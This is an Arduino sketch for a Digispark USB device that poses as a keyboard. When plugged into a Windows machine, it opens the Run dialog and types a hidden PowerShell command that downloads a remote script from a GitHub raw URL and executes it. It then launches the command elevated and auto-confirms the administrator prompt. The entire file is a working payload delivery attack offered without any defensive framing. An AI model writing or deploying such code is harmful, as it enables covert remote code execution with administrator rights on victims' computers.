#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/run.ps1');");
 DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
 for (;;) {
}
}
